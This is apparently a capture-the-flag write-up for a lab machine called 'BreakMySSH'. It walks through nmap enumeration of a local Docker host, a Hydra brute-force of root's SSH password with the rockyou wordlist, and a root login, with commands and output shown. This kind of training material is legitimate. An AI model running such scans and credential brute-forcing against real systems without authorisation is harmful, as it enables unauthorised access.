# BreakMySSH

## Reconnaissance and Enumeration.

Check that the machine is up.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Once we get a ping response, we can start enumerating the machine. The ttl=64 can indicate that it is a **Linux** machine.

We launch nmap to see what ports it finds.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Performs a SYN scan.
- `-p-`: Scans all ports.
- `--open`: Shows only open ports.
- `--min-rate 5000`: Sets the minimum packet sending speed to 5000 per second.
- `-vvv`: Generates very detailed and verbose output.
- `-n`: Avoids reverse DNS resolution.
- `-Pn`: Skips host detection.
- `-oG allPorts`: Saves the results to a file called "allPorts".
- `172.17.0.2`: The IP address of the target host.

```bash
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Since we have port 22 open, we are going to check the version and run some basic scripts to see what information we get.

```bash
nmap -sCV -p22 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Scan for versions and vulnerabilities.
- `-p22`: Scan for ports 22 (SSH).
- `-vvv`: Very verbose and verbose output.
- `-oN versionPorts`: Save the results to "versionPorts".
- `172.17.0.2`: IP address of the scanned host.

```bash
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 64 OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
| 2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfOr49bj2kh3ab2WutTu6Jx7NA7OKSxzp42bJU4nqtQlICZbjiBXhOa1ZKOfUfN vXOGEThiSrTNbf1nRGzXtACiZQp+RwQr5ZEYPAOyasC7C29FaIZVURR7FuFea+tfWZjbzDaP8WnA/U3TQHwtUBsNSR3qFs cgJQ1niCyrfH/4rbUk5jiLYN6y8NjctGvsvwPE+cCiFVge76qyfzmZdaf5gJT9DKDt47iBkrngCODYrqqt+Bbl9ZEGh5 SUfDqYfsFMIvlsSjmbx0HtMc2NhTW7jLtyV3Xm6ynFUZmQRPRqXdzuN5TIhYzaQD8ogC1Hk9sYJJNUMMF+lGVf15iouMn
| 256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLJ77V//dhC1BX2KXpMNurk9hJPA3aukuoMLPajtYfaewmlwrsK5Rdss/I/iQ23YrziNvWb3VMJk511YbvvreZo=
| 256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICFLUqv+frul58FgQLXP91bNrTRC9d1X545DZJ0wsw6z
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Since we have a version of ssh that does not allow user enumeration and we only have port 22 open, we are going to try with hydra and brute force if we can obtain the root password.

## Exploitation.

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
- `-l root`: Specifies the username "root" for the login attempt.
- `-P /usr/share/wordlists/rockyou.txt`: Specifies the location of the password file to use. In this case, the file "rockyou.txt" is used as the password list.
- `ssh://172.17.0.2`: Specifies the protocol to use (`ssh`) and the IP address of the target host (`172.17.0.2`). This sets the destination of the SSH login attempt.

```bash
❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-16 15:29:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2 login: root password: star
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-16 15:29:49
```
With hydra we find the password for the root user and we connect via ssh to the machine.

```bash
ssh root@172.17.0.2
```
We try to connect with the obtained password and we have access to the machine as root.
```bash
root@74dc51463f0e:~# whoami
root
root@74dc51463f0e:~#
```
